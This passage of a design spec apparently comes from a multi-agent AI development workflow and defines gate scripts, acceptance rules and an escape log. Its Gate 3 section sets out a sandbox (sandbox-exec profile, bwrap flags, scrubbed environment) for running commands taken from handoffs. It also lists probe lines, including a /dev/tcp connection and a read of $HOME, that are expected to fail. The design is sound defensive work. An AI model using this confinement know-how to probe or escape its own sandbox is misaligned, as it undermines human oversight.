- D6 (design decision, recorded as an assumption for Gate 4 to list) Cora's simple tier keeps no separate Gate 4 dispatch: its run reviewer already runs the change from the request line, and its file gains the same `## For the human` block that Cora relays. Reason: the human set the simple tier as "two light reviewers" (G2); adding an acceptor raises it from at most six to seven dispatches for a change with no design choice. If he wants a Gate 4 there, it is one line in Triage.

### 4.2 Component Specifications

#### 4.2.1 Gate 1
- **Canonical `## Gate 1: Requirements Clarity`** (edit first): `**Owner:** the human (content: per-block playback) + Alex (content: "can design from it") + gate1-format-check.sh (format) | **When:** after the per-block playback is confirmed, before design (Cora: before the intake dispatch)`. Items (each "Why ME"): `What the human gets / Not wanted — Result contract lines`; `Done check per deliverable — a Done check block in ## Requirement (handoff: §1.5)`; `Decisions for the human listed; Premise and size (blast radius) stated`; `Estimate stated — **Budget**`. Then: "Checked by: format → `bash .tad/hooks/lib/gate1-format-check.sh <Epic | handoff | journal>` (advisory, exit 1 = something missing); content → his confirmed playback and Alex's line 'can design from it' (or the block it cannot). No self-score." Why CE line rewritten. The old "Method grammar" note moves to Gate 2 as item `§9.1 Methods legal — command | path-check | fixture | rubric-spawn | light-tier N/A; prose-only illegal (consistency lens baseline run)`.
- **gate SKILL** Gate 1 inline copy synced (title without "Optional Quick Check"; `When`/`Owner` as canonical; Output: the script's OK/MISSING lines). :14–23 trigger lines: Gate 1 "per-block playback confirmed, before design"; Gate 3 "after implementation and commit — the run reviewer"; Gate 4 "after Gate 3 — the acceptor (Alex that took no part)"; rules 2–3 reworded the same way. :55–58 list: "1. Gate 1: Requirements Clarity (playback + format script, before design)", "4. Gate 4: Acceptance (Alex acceptor that took no part, after Gate 3)". Gate 2 inline copy gets the moved item.
- **Alex `my_gates.gate1`**: `when` unchanged; `items: "What the human gets + Not wanted + Done check + Decisions for the human + Premise + size (blast radius) + estimate (Budget)"`; add `checked_by: "gate1-format-check.sh (format); the human's confirmed per-block playback and my line 'can design from it' (content); no self-score"`; `blocking: true` stays.
- **config-quality `gate1_requirement.checks`**: the four conditions.
- **Script `.tad/hooks/lib/gate1-format-check.sh`** (CREATE; header comment: advisory CLI, never a hook, never in settings/hooks.json, no `set -e`): `Usage: gate1-format-check.sh <file>`; exit 0 = every check OK, 1 = any MISSING, 2 = usage/unreadable. Prints one line per check, `OK <id> <what>` or `MISSING <id> <what>`. Mode by content:
  - Epic (file has `**Epic ID**`): c0a `## Requirement` with ≥1 line `^- \*\*`; c0b `^### Q→A log`; c0c `^### Assumptions`; c1a a line containing `What the human gets` inside `## Result contract`; c1b `Not wanted` inside `## Result contract`; c2 a line matching `^- \*\*([A-Za-z0-9]+\. )?Done check` (ERE, case-insensitive) inside `## Requirement`; c3a heading `^### Decisions for the human`; c3b a line `^Premise:` inside `## Result contract`; c3c `**Depth**:` line containing `blast radius`; c4 `**Budget**:` line containing a digit. ("Inside a section" = from its heading to the next `^## `.) Output line format exactly `OK <id> <what>` / `MISSING <id> <what>` (one space after the id; R2a, R2d grep `^MISSING <id> `).
  - Handoff (basename `HANDOFF-*`): if the header has `**Epic:** EPIC-` → print `OK g0 Gate 1 is the Epic's: run on <Epic>` and exit 0; if it has `## Bug Description` → b1 that section has ≥1 non-blank line, b2 the §9.1 region has ≥1 line starting `| AC` (the repro); else inside §1.5 (from `^### 1\.5 Requirement` to the next `^## ` or `^---$`): c0 the heading, c2 `^- \*\*([A-Za-z0-9]+\. )?Done check` (ERE, -i), c1 `^- \*\*([A-Za-z0-9]+\. )?Not wanted` (ERE, -i), c0b `^#### Q→A log`, c0c `^#### Assumptions`. Line-anchored on purpose: the template's own instruction line in §1.5 must not satisfy a check.
  - Journal (simple tier; neither of the above): the last line containing `request:` must contain `blocks:` (j1), `Done check` (j2), `Not wanted` (j3), `qa:` (j4), `assumptions:` (j5), `risk_triggers:` (j6).
  Expected on this Epic (predates the method): exit 1, three MISSING (c2, c3a, c3b) — R2b (re-derived: its Requirement blocks are lettered `- **A. …**` … `- **G. …**`, none is a Done check; it has `**Budget**: estimate ~28`, `**Depth**: … blast radius`, `What the human gets:`, `Not wanted:` in `## Result contract`, `### Q→A log (2026-10-19)`, `### Assumptions …`).
- **Carriers** (K18, K39): `requirement-clarification.md` §2 :14 → "A block for the done check (how the result is judged) is always present, and so is a block for what he does not want; they are recorded as the lines `- **Done check**: …` and `- **Not wanted**: …` (a letter prefix such as `- **E. Done check**:` is fine)." §5 :31 Epic record and :33 direct handoff name the same two lines; :33 adds "then `#### Q→A log` and `#### Assumptions (not asked; Gate 4 lists them)`". Handoff template §1.5 instruction line → "Direct /alex without an Epic: block lines `- **<block>**: …` including `- **Done check**: …` and `- **Not wanted**: …`, then `#### Q→A log` and `#### Assumptions (not asked; Gate 4 lists them)`." (prose, not line-anchored, so it never satisfies the checks itself). Cora SKILL :19 simple-tier journal fields → "`blocks:` (one entry each, including `Done check` and `Not wanted`), `qa:`, `assumptions:`"; the journal line already carries `risk_triggers:`.
- **Who runs it**: Cora Intake — after writing the Epic and before the intake dispatch; a MISSING item she fills in her own Epic file (or asks the human that block: clarification, not a stop), and she does not dispatch intake on an Epic the script flags. Cora simple tier — on her journal line before the Blake dispatch. Direct `/alex` — `handoff-creation-protocol.md` step1b runs it on the draft (handoff mode); express and `*bug` the same.
- **Epic template**: add `**Budget**: {estimate}` and `**Depth**: {level} — Risk: {reversible | one-way}; blast radius: {what is affected}` placeholders under the header, each at line start (R2a deletes `^\*\*Budget\*\*`); in `## Requirement` example add `- **Not wanted**: …` and `- **Done check**: …`; add after `### Assumptions` (before `## Success Criteria`) a `## Result contract` whose three lines are plain lines at line start, not bullets (as in this Epic; c3b and R2a anchor `^Premise:`): `What the human gets: …`, `Not wanted: …`, `Premise: {what must be true for this to be worth doing}`; then `### Decisions for the human (settled before "continue")` + `- {decision} → {his answer, or "none"}`.
- **Cora Intake** text: Result contract bullet names `What the human gets:`, `Not wanted:`, `Premise:`; the decisions bullet names the heading `### Decisions for the human`; one new bullet runs `gate1-format-check.sh` before the intake dispatch (R12). `requirement-clarification.md` §5 Gate 1 line: "Gate 1: the four conditions in `.tad/gates/gate-canonical-checklist.md`; his confirmed playback plus Alex's 'can design from it'".

#### 4.2.2 Gate 3
- **Script `.tad/hooks/lib/gate3-check.sh`** (CREATE; header: advisory CLI, never a hook; executes command lines from a handoff only inside an OS sandbox around a disposable copy of the repo — no network, no write outside the copy, no read of `$HOME`; it never inspects command text to decide safety; re-plan p3-y6-replan-1). Subcommands:
  - `rerun <handoff> [--out <file>] [--id <dispatch_id>]` — exit 0 always (records; judging is the reviewer's), 2 on usage. Region: from `^## 9\.1` to the next `^## ` line. Rows: lines starting `| AC`; the AC id is the first cell (`AC<n>`); the Verification Method column is found by the header cell named `Verification Method`. A cell that is one backtick span → that command (`\|` → `|`), output row name `AC<n>`; a cell that lists ids (ERE `^[A-Za-z][A-Za-z0-9]*(, *[A-Za-z][A-Za-z0-9]*)*$` after trimming, e.g. `R1a, R1b`) → for each id its line `^<id>:[[:space:]]` in a fenced block inside the region, prefixed with that block's `ENV:` line content plus `; ` when present, output row name `AC<n>/<id>` (an id with no such line → row `AC<n>/<id>` with `not-scriptable`); anything else → one row `AC<n>` with `not-scriptable`. No deny list and no allowlist: command text is never used to decide safety (premise file). **Execution model (re-plan p3-y6-replan-1)**, in this order:
    1. *Box.* `BOX=$(mktemp -d)`; if `$BOX` lies under `$HOME`, use `mktemp -d /tmp/gate3-box.XXXXXX` instead (the profile denies reads under `$HOME`). `trap` removes `$BOX` on every exit path (`rm -rf` on the script-made path only, never following symlinks). The copy `$BOX/repo` = `GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null git clone --no-local --no-hardlinks --template= --quiet <toplevel> $BOX/repo` (full history, so `$B`, `HEAD~1`, `git show $B:…` work), checkout of the same HEAD, then `git -C $BOX/repo remote remove origin`; then the working tree overlay: every path from `git ls-files -z -m -o` (modified tracked, untracked and ignored) except paths under `.worktrees/`, any `node_modules/` and any nested `.git/`, copied with its mode, symlinks copied as symlinks (`tar` or `cp -P`, never followed), and `git ls-files -z -d` paths deleted in the copy — so the copy reads like the working tree a reviewer would run by hand (gitignored completion report, fixtures and escape log included). Secrets in ignored files can be printed into the ac-rerun output exactly as by hand; they cannot leave the machine (no network). `$BOX/home` (HOME), `$BOX/tmp` (TMPDIR) and `$BOX/bin` (a `mktemp` shim: `exec /usr/bin/mktemp -p "$TMPDIR" "$@"` on macOS, whose `mktemp -d` ignores TMPDIR; on Linux `mktemp` honours TMPDIR and no shim is needed) are created.
    2. *Sandbox.* macOS: `/usr/bin/sandbox-exec -f $BOX/profile.sb`, profile written by the script: `(version 1) (allow default) (deny network*) (deny mach-lookup) (deny appleevent-send) (deny file-write*) (allow file-write* (subpath "$BOX") (literal "/dev/null") (literal "/dev/tty") (literal "/dev/dtracehelper")) (deny file-read* (subpath "$HOME"))` with `$BOX` and `$HOME` substituted as resolved real paths (`cd … && pwd -P`). Linux: `bwrap --ro-bind / / --dev /dev --proc /proc --tmpfs /tmp --tmpfs "$HOME" --bind "$BOX" "$BOX" --unshare-all --die-with-parent --new-session --chdir "$BOX/repo"`. Neither found (`command -v`) → no row runs.
    3. *Environment.* Every row runs as `<sandbox> /usr/bin/env -i PATH="$BOX/bin:<caller PATH minus entries under $HOME>" HOME="$BOX/home" TMPDIR="$BOX/tmp" LANG="${LANG:-C}" LC_ALL="${LC_ALL:-}" GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null GIT_TERMINAL_PROMPT=0 bash -c "$cmd"` with cwd `$BOX/repo` (no SSH_AUTH_SOCK, no tokens, no `GIT_*` from the caller), timeout 300 s via `perl -e 'alarm shift; exec @ARGV'` when perl exists. Stdout+stderr go to a file inside the box; the script (outside the sandbox) copies its first 40 lines into the output.
    4. *Probe (before any row).* Inside the sandbox with the same environment: (p1) write to a file in a second script-made `mktemp -d` outside the box must fail and the file stay absent; (p2) `ls "$HOME"` (the caller's) must fail; (p3) `exec 3<>/dev/tcp/1.1.1.1/53` under a 3 s alarm must fail (on an offline host it fails anyway: nothing can go outward); (p4) `touch "$BOX/repo/.gate3-probe"` must succeed. Any probe result other than expected → no row runs.
    5. *Not run.* With no sandbox tool every scriptable row is recorded `not-run: no sandbox (sandbox-exec or bwrap) on <uname -s> — run by hand`; with a failed probe `not-run: sandbox probe failed (<p-ids>) — run by hand`; the output header carries one line `sandbox: <sandbox-exec|bwrap|none> probe: <ok|failed p…>`. Exit stays 0.
    The ac-rerun header line `# AC re-run: <handoff> @ <sha>` names the copy's HEAD (the same sha). Rows may now write inside the copy (harmless, discarded); a §9.1 row that writes into the repo is still a Gate 2 design defect (K8), because it means the row depends on mutated state. Output (to `--out` or stdout): line 1 `dispatch_id: <id>` when `--id`; `# AC re-run: <handoff> @ <git rev-parse --short HEAD>`; table `| row | exit | command |` with one row per command, written `| <row name> | <exit cell> | <command> |` with single spaces (`| AC1 | 0 | … |`, `| AC3/R3b | 0 | … |`, `| AC5 | not-run: no sandbox (sandbox-exec or bwrap) on Linux — run by hand | … |`; `|` in a command cell written `\|`; exit cell = number, `not-run: …`, or `not-scriptable`); then `### <row>` with the first 40 lines of output in a fence.
  - `paths <handoff> <verdict-file>` — reads `real_paths:` ids (`- id: <ID>`) from the handoff's first frontmatter block; for each prints, first match wins: `COVERED <ID> run` (a `| <ID> |` row in the file's `## Real paths` table with a non-empty last cell), `COVERED <ID> not-run` (a line in `## Not run` containing `<ID>` and `not-run:`), `BLOCKED <ID>` (a line in `## Blocked` containing `<ID>`: contract §6 friction, unresolved), or `MISSING <ID>`. Exit 0 when no MISSING (BLOCKED lines included: the verdict rule below caps them), 1 any MISSING or no `real_paths` (`MISSING real_paths`), 2 usage.
- **Contract §5 run** (edit): "runs `bash .tad/hooks/lib/gate3-check.sh rerun <handoff> --out <its ac-rerun path> --id <its id>` first, runs by hand every row the script marks `not-scriptable` or `not-run` (no sandbox / probe failed) that is safe to run, in a scratch copy, and compares every row with Expected Evidence (one row each in its file: row, result, pointer into the ac-rerun file); runs every `real_path` (§6) into a `## Real paths` table `| id | what was run | output pointer | result |` and a `## Not run` list (`- <id> not-run: <reason>`); before saving runs `gate3-check.sh paths <handoff> <its own file>` and pastes the output". On the simple tier it also writes `## For the human` (verdict line + 3–5 evidence lines with pointers) for Cora to relay (D6).
- **Contract §1 self-consistency** add: "`lens: run` ⇒ the pasted `gate3-check.sh paths` output has no MISSING line, else the verdict is FAIL with one P0 per missing path (blocks: that path's AC / Result-contract deliverable); a BLOCKED line ⇒ the verdict is at most PARTIAL with that item under `## Blocked` (§6)."
- **Contract §6** scratch bullet: the `rerun` repo-root exception and the read-only rule for §9.1 commands (K8).
- **Canonical Gate 3** add two items: `AC re-run by script — gate3-check.sh rerun output file present (dispatch_id of the run reviewer); every row compared with Expected Evidence. Why ME: 重算是否真跑` and `Real paths covered — every real_path has a run row or "not-run: <reason>" (gate3-check.sh paths exit 0). Why ME: 真实路径覆盖`; MECE comment → 9 items. Gate SKILL Gate 3 inline copy synced; its §9.1 block step1 says the run reviewer starts from `gate3-check.sh rerun`.
- **Paths of the ac-rerun file**: Cora runs `.tad/evidence/yolo/{slug}/phase{N}-ac-rerun.md` (round k ≥ 2: `-r<k>`); simple tier `.tad/evidence/simple/{date}-{slug}-ac-rerun.md`; direct `/blake` `.tad/evidence/reviews/blake/<slug>/ac-rerun.md` (contract §8 Paths line; conductor evidence_structure).
- **Conductor step_Y6 2 run prompt**: add "Run `bash .tad/hooks/lib/gate3-check.sh rerun {handoff_path} --out .tad/evidence/yolo/{epic-slug}/phase{N}-ac-rerun.md --id {id}` first, and `gate3-check.sh paths` on your file before saving (review contract §5 run)." Blake Layer 2 `reviewers.run.writes` names `ac-rerun.md` too, and `reviewers.run` gains `runs_first: "bash .tad/hooks/lib/gate3-check.sh rerun <handoff> --out .tad/evidence/reviews/blake/<slug>/ac-rerun.md --id <id>; gate3-check.sh paths <handoff> <its gate3-verdict.md> before saving (review contract §5 run)"` (R3a needs `gate3-check.sh` in Blake SKILL).

#### 4.2.3 Gate 4
- **The acceptor's duties** (one text, in the gate SKILL Gate 4 section; the others point to it and repeat the key lines that R4a checks):
  1. Reads `## Requirement`, Result contract and Assumptions (Epic; direct: handoff §1.5 and §9), the Gate 3 files, the completion report. Runs `gate3-check.sh paths <handoff> <Gate 3 run file>`: MISSING → FAIL.
  2. Acts as the human: lists what he will do with the result, and does each once for real (install, build, call, open the page) in a scratch location — or drives a browser where its own tool list has one (Claude Code examples: the Browser pane, Claude in Chrome, a Playwright MCP); protocol text: named scenario walks quoting file:line. Evidence (screenshots, run logs, quoted lines) under `.tad/evidence/yolo/{slug}/phase{N}-gate4/` (Cora) or `.tad/evidence/reviews/alex/<slug>/gate4/` (direct). One real use per path, never a batch or a measurement (contract §6).
  3. Judges against `## Requirement` + Result contract (a departure names the requirement line). Recomputes quantitative ACs from raw files (AR-005) and any PARTIAL in play ([A089]); every other §9.1 row is read from the Gate 3 ac-rerun file, not re-run. A self-report that disagrees with disk counts as failed ([A037]).
  4. What only the human can do — a real device, a payment, his own account login — goes under `## For the human` as `Needs you: <item> — <reason>`; no other item is asked of him. No browser tool on this harness/subagent: `not-run: no browser tool on <harness>` under `## Not run` and as a `Not run:` line in `## For the human` (shown to him, never asked; not a `Needs you:` item); the verdict is given on what ran, and a UI deliverable whose real use did not run caps it at CONDITIONAL (a carried item, contract §7: it does not block, it is not a PASS on that deliverable). The dispatcher (Cora step_Y7 3; Alex at `*accept` step3) re-dispatches the acceptor once on a subagent whose tool list has a browser when the harness offers one, before relaying. Installing a browser tool is a new dependency: a question (risk card [A036], pinned version, lock file), never silent and never a precondition. A paid call: stop — Cora run: class 3 question (stop reason 3); direct: Alex asks the human.
  5. Release (the Result contract or phase includes a tag or publish): honours `.tad/project-knowledge/rulings/human-rulings.md` 2026-10-16 — installs the release archive shape (`git archive` of the release commit) end to end into a throwaway project before the tag. The real download install right after the tag is run by the party that pushes the tag (the release step, under the same confirmation as the tag — a stop-list action), never handed to the human; the acceptor records it under `## Not run` as `not-run: after the tag — run by the release step (human-rulings.md 2026-10-16)` and as a `Not run:` line in `## For the human`. (The release-runbook has no such step today; adding it is release text, outside this phase — Open P1 for Gate 4.)
  6. Report (`lens: acceptor` header) ends with `## For the human`: line 1 `verdict: <…> — <one sentence>`; then 3–5 lines `- <what was done> → <what it showed> (<pointer>)`; then `Needs you:` items, `Not run:` items, `Assumptions:`, `Open P1:`. Knowledge Assessment and `## Knowledge candidates` unchanged.
- **gate SKILL Gate 4** (`:577–918`): title line `## Gate 4: Acceptance (Alex acceptor that took no part) - **MANDATORY** 🔴` (keeps the anchor `^## Gate 4: ` and the MANDATORY token); the blockquote `:578–584` rewritten (no security-auditor / performance-optimizer names: "Gate 4 is one acceptor on every path and task_type; the Gate 3 lenses, including the domain lens when risk_triggers lists security, data or money, are its prerequisite; rubric ACs: the Gate 3 judge verdict PASS"); `Owner: an Alex acceptor that took no part — dispatched by Cora in her runs, by the designing Alex at *accept in direct mode; never Blake, never the designer`. Replace exactly: `Structural_Subagent_Conditionality` (`:625–629`), `Required_Subagents`, `Evidence_Naming` and `Recommended_Templates` (`:655–706`), the inline `Critical Check (4 items)` block and its two notes (`:729–746`, synced to the canonical Gate 4 items below), the Quality Evidence / Acceptance Checks tables of the output format (`:759–773`), and inside the fence the `## ⚠️ Gate 4 Subagent Requirement` heading through its Workflow list (`:787–804`) and `Acceptance_Report_Format` (`:806–834`) — with `Acceptance_By_Real_Use` (duties 1–6) and `Gate3_Evidence_Check` ("Gate 3 files present for every lens of contract §8 — run, consistency, and domain when risk_triggers lists security/data/money; ac-rerun file present; `gate3-check.sh paths` exit 0; FAIL enumerates what is missing"). Untouched: the output format's `#### Knowledge Assessment (MANDATORY - must answer)` table and the four lines under it (`:775–785`), `Knowledge_Assessment_Gate4` and `Post_Pass_Actions` (`:836–918`). Restated in new form (one line each, R9a): "VIOLATION: a Gate 4 PASS while a security, data or money trigger has no Gate 3 domain review file; the domain lens MUST NOT be skipped by leaving a trigger the change has off the list" (replaces `:629` VIOLATION + MUST) and "MANDATORY: acceptance by real use — reading files is not acceptance (no paper acceptance); for protocol or prompt text the real use is a named scenario walk quoting file:line (contract §6)" (replaces `:790`). Every line left in the Gate 4 range that names security-auditor or performance-optimizer also contains `trigger`, `domain` or `Claude Code` (R4b). Prerequisite, Gate4_Friction_Review, Gate4_Feedback_Check, Decision_Compliance, Trust_Curve_Judgment, Knowledge_Assessment_Gate4 and the rubric section: Stay (their "Alex" wording means the acceptor). Fail-close lines (:734, :746) become: "cannot Gate 4 PASS if the Gate 3 ac-rerun file is missing or a row is neither run nor recorded not-run; Blake summary is not Gate 4 evidence; a self-report that disagrees with the ac-rerun output → that item FAIL and gate4_delta". Output format: replace the Quality Evidence table with Real use / Gate 3 evidence / For the human tables.
- **Canonical Gate 4**: Owner as above; items: `Acceptance by real use — what the human will do, done once for real or in a browser; evidence under the gate4 dir; judged against ## Requirement + Result contract`; `Gate 3 evidence complete — every contract §8 lens file, ac-rerun file, gate3-check.sh paths exit 0 (FAIL enumerates missing)`; `Issues — every P0 resolved; open P1, Assumptions, not-run items and human-only items (real device, payment, own account login, with reason) listed for the human`; `Knowledge Assessment complete — distillation loop 或 "no new discovery"` (byte-identical to today). Fail-close lines restated as in the gate SKILL.
- **conductor step_Y7 2 prompt** (keep every tag): add after "Read …": "Act as the human (gate skill Acceptance_By_Real_Use): what he will do with the result, done once for real or in a browser (screenshots / run logs under .tad/evidence/yolo/{epic-slug}/phase{N}-gate4/), judged against {epic_path} ## Requirement, Result contract and Assumptions; run `gate3-check.sh paths {handoff_path} <latest gate3 verdict>`. Only a real device, a payment or his own account login goes to the human, with the reason. No browser tool: `not-run: no browser tool on <harness>`, verdict on what ran. A paid call or a browser-tool install: write a class 3 question to the phase questions file and stop. A release honours .tad/project-knowledge/rulings/human-rulings.md. End with `## For the human`: the verdict and 3–5 evidence lines." Y7 3: Cora also reads `## For the human` presence (missing = incomplete, re-dispatch, like KA [A007]); a report with `not-run: no browser tool` → one re-dispatch of the acceptor on a subagent type whose tool list has a browser when her harness offers one (routing, not a verdict), else relay. epic_completion 4: the acceptance question quotes each phase's `## For the human` block with its pointer (relay, not a judgment).
- **dispatch-mode Gate 4 kind**: "You took no part in the design or the build. Write the gate report only: act as the human (gate skill Acceptance_By_Real_Use — real run or browser, screenshots / run logs, judged against `## Requirement` + Result contract, Assumptions listed; real device, payment, login → the human with the reason; `not-run: no browser tool on <harness>`; `gate3-check.sh paths`); end with `## For the human`; the Knowledge Assessment and `## Knowledge candidates`; no knowledge entry, not the Epic."
- **acceptance-protocol** (direct `/alex *accept`, also after `*express`, `*bug`, `/blake`): v2_note → "Gate 3: run + consistency (+ domain) reviewers, run reviewer signs; Gate 4: an acceptor that took no part, by real use". step1–step2: completion report + Gate 3 files (run reviewer's `gate3-verdict.md` PASS/CONDITIONAL). step3: "Dispatch the acceptor — a fresh subagent that took no part (never me: I designed it), prompt as conductor step_Y7 2 with direct paths (handoff, completion, `.tad/evidence/reviews/blake/<slug>/`, output `.tad/evidence/reviews/alex/<slug>/gate4-report.md`, evidence `…/gate4/`); a paid call or a browser install: I ask the human." followed by the key lines written out (R4a reads this whole file): "The acceptor acts as the human: does once for real what he will do with the result, or drives a browser (screenshots / run logs under `…/gate4/`); judges against `## Requirement` (handoff §1.5 in direct mode), the Result contract (handoff §1.1/§1.3 when there is no Epic) and Assumptions; runs `gate3-check.sh paths <handoff> <gate3-verdict.md>`; only a real device, a payment or his own account login go to the human, as `Needs you:` with the reason; no browser tool: `not-run: no browser tool on <harness>` (then I re-dispatch once on a subagent with a browser when this harness offers one); the report ends with `## For the human`." step4: Alex reads the header and relays `## For the human`; per-AC table now comes from the acceptor's report (fail-close lines kept). step4b: Stays (acceptor checks e2e/research evidence). step4c: tier map (:62–100) replaced by "two lenses on every path (review contract §8): DISTINCT_COUNT ≥ 2 lens files, else the visible UNDER-MET warning"; still advisory. step5–step6: "【人】He receives the verdict and 3–5 evidence lines, plus any `Needs you:` items with reasons, and answers accept or reject; no demo or walkthrough is asked of him." technical_review_note and gate4_v2_checklist: business_acceptance → acceptor items; human_approval → "verdict + evidence relayed; his answer recorded". step4d–step4f, step7, step7d, step8–9, violations: Stay.
- **Alex SKILL**: `gate4_v2` → `owner: "an acceptor that took no part (I dispatch it at *accept; Cora in her runs)"`, items per canonical, `note: "acceptance by real use from the human's side; the human gets verdict + 3–5 evidence lines"`. `mandatory_review` block (:1292–1350) → `acceptance_by_real_use` pointing to acceptance-protocol step3 (keep `minimum_requirement` key, new value "one acceptor that took no part; Gate 3 lenses per review contract"). :1541–1591: step 7–8 lines, `*gate 4`, Gate Ownership block ("Gate 1: the human + me (+ format script); Gate 2: two lens reviewers; Gate 3: run reviewer signs (Blake prepares); Gate 4: acceptor, I relay"), Gate 4 checklist, Remember lines, the LLM note. Registry untouched.

#### 4.2.4 Escape log
- **Template `.tad/templates/escape-log.md`** (CREATE, shipped): title, one paragraph (what counts: a defect found after Gate 4 / acceptance of a result), the header row exactly `| date | defect | found by | gate that should have caught it | pointer |` with its separator, and a rule table for column 4: defect shown by a §9.1 command or a listed real_path → `Gate 3`; a path or case the handoff did not list → `Gate 2`; a mismatch with `## Requirement` / Result contract that a real use would show → `Gate 4`; the requirement itself wrong or missing → `Gate 1`; unclear → `unclear` (the fix's designer fills it later). Writers and reader named in it.
- **Live file `.tad/evidence/escape-log.md`**: created from the template (gitignored evidence dir — it exists on disk, not in git; created by the writer on first use when absent in a downstream project).
- **Writers**: Cora — when a defect in an accepted result is reported to her, she writes the line before triaging the fix (Triage bullet; the Record write-list line `cora/SKILL.md:74`, which starts "She may write only", gains "the escape log (`.tad/evidence/escape-log.md`)" on that same line — R5 greps that line); direct `/alex *bug` step2 — when the bug is in an accepted result (archived handoff or completed Epic), Alex writes the line with the diagnosis into `.tad/evidence/escape-log.md` (the path written out in step2; created from the template when absent).
- **Reader**: distillation — conductor epic_completion 3b input list adds "the escape-log lines dated since the last distillation (`.tad/evidence/escape-log.md`)"; `distillation-loop-protocol.md` conductor section and its Precondition exception name the same file (lines are candidates under the variabilize test, like gate-report candidates).

#### 4.2.5 Same on every path (summary Blake implements across the files above)
| Path | Gate 1 | Gate 3 | Gate 4 |
|---|---|---|---|
| Cora Epic / handoff tier | Intake: script on the Epic + his playback + intake Alex | Y6 run (+ script) + consistency (+ domain) | Y7 acceptor |
| Cora simple tier | script on the journal line + his playback | run (+ script) + consistency (+ domain) | none separate; run file's `## For the human` relayed (D6, assumption) |
| direct `/alex *handoff`, `*express`, `*spike`, `*experiment` | his playback + step1b script on §1.5 (Epic phase: g0) | Blake's Layer 2: run (+ script) + consistency (+ domain) | `*accept`: acceptor dispatched by Alex |
| direct `*bug` | playback of the symptom + step1b script (bug mode); escape line if in an accepted result | same | `*accept` after Gate 3 (acceptor runs the reported repro) |
| direct `/blake` | — (handoff given) | Layer 2 as above; completion report written before the Layer 2 dispatch | `*accept` (Alex) |

Bug-path step4 Blake Instructions: "… → Gate 3 reviewers … → then Alex `*accept` (Gate 4 acceptor)"; ":85 escalate to user" → "escalate to Alex". Express `required_steps` last item → "Gate 4: the acceptor at *accept (acceptance-protocol step3)". Learn-path :103 → "KEEPS two reviewers (review contract §8)". Contract §8 "Who dispatches" (:85) adds the Gate 4 acceptor (K19). `*spike` has no gate text of its own: it follows `*handoff` (its registry lines in Alex SKILL `:1633–1639` are byte-exact and already require two reviewers).

#### 4.2.6 Advisory scripts (read `shell-portability.md` first; exit codes unchanged)
- `pre-gate-check.sh` Check 10 message → "Did the Gate 3 reviewers (review contract) run?"; Check 11 → look for `gate3-verdict.md` and `consistency-review.md` under any `.tad/evidence/reviews/blake/*/` newer than the completion report, or `phase*-gate3-verdict.md` + `phase*-impl-review-consistency*.md` under `.tad/evidence/yolo/*/`; WARN "Gate 3 needs the run and consistency reviewer files (review contract §8)". Still WARNING only.
- `layer2-audit.sh`: add lens names `gate3-verdict` (run), `consistency-review`, `domain-review` to the counted list (each counts once as a lens); move `gate3-verdict` out of SUBSTITUTION; add `ac-rerun` and `gate4-report` to an ignored list (not reviewers, no unknown WARN); drop the express exception branch (one lens → `WARN_REVIEWER_COUNT=1` for express too; keep `is_express_*` functions only if still used, else remove with their comment); comment :251 → "two lenses → PASS". Exit set stays {0,1,2}.
- `audit-yolo.sh`: design review = `phase{n}-design-review-consistency.md`, else legacy `-cr.md`; second design review = any other `phase{n}-design-review-*.md` (risk/fit/domain); impl = `phase{n}-impl-review-consistency.md` else `-cr.md`; Gate 3 run file `phase{n}-gate3-verdict.md` counts as the second impl review; timing uses whichever exists.
- `post-write-sync.sh:150` comment → "the run reviewer's Gate 3 verdict, not a finding list" (behaviour unchanged).
- `pre-accept-check.sh:50` message only (K38); `exit 2` unchanged.

#### 4.2.7 Templates, configs, docs (wording)
- Handoff template: real_paths comment adds "the Gate 4 acceptor also does what the human will do"; §8.4 friction example row (Group 0) → "a reviewer lens unavailable → any fresh subagent given the lens (contract §9); self-review never equivalent"; §9 list: "UI符合设计（acceptor screenshots）", "Gate 4 acceptor (AI, took no part) accepts by real use; only device/payment/own login go to the human, with reason" replacing "Human验证…".
- Completion template: `### Layer 2` rows name the ac-rerun file; new `### Real paths` (Blake lists each `real_paths` id and any path he expects `not-run: <reason>`; the run reviewer records the runs in its file); Evidence Checklist "Expert Review Evidence" → the lens files + ac-rerun; "📝 Human 验收区" → "📝 Gate 4 (acceptor) and the human's answer" (pointer to the gate report, his answer).
- config-quality: `gate4_v2_acceptance_archive` description/checks per canonical; `gate_responsibility_matrix` rows → lenses (run, consistency, domain, risk/fit, acceptor) with principles "Gate 3: run reviewer signs; Gate 4: acceptor by real use"; `mandatory.gate_3` → run + consistency files, `mandatory.gate_4` → acceptor gate report; `enforcement.gate_3_check/gate_4_check` requirements accordingly. config-execution :17–20 → "Layer 2: Gate 3 reviewers per review contract (run, consistency, domain when listed)". config-agents participation_points `gate3_implementation` values → "Gate 4: reads the verdict + 3–5 evidence lines; does only device / payment / own-login items". spec-compliance-format :3 → "(optional consistency-lens format)".
- README :52 "…the Ralph Loop; prepares Gate 3 (the run reviewer signs it)", :69 "Gate 1 requirements (your confirmed playback), Gate 2 design (two lens reviewers), Gate 3 implementation (run + consistency reviewers), Gate 4 acceptance (an AI acceptor that did not build it, by real use)"; AGENTS.md :6 same for Blake, :43 "Gate 3 preparation"; tad SKILL :120–125 table owners; CODEX guide :95–101, :172–186, :386; RALPH-LOOP :71 "Pass: no P0/FAIL/PARTIAL; P1 carried", :262–275; docs/process-tax-cut :64 and patterns/process-tax-cut :8 "two reviewers with different lenses". `gate-execution-guide.md`: SUPERSEDED banner (K30). tad SKILL :67–68 and :115–116 ("Gate 4 v2 Simplified: Pure business acceptance by Alex", "Report to Alex for Gate 4 v2") → Gate 3 reviewers / Gate 4 acceptor wording, same as :120–125.
- experiment-path-protocol (K35): :59 → "Gate 3 (run + consistency reviewers per the review contract, AUGMENTED with 5 experiment-validity checks)"; :60 → "Gate 4 (the acceptor by real use, acceptance-protocol step3, AUGMENTED with 4 experiment outcome checks)"; :65 and :67 "Original Gate 3 v2" → "The Gate 3 run (build / test / lint / coverage)"; :81 → "The acceptor's real use against `## Requirement` STILL APPLIES." deliverable-handoff :243 (K36) → "→ Gate 4 (the acceptor, by real use)".

### 4.3 Carried conditions (Phase 1/2 gate reports)
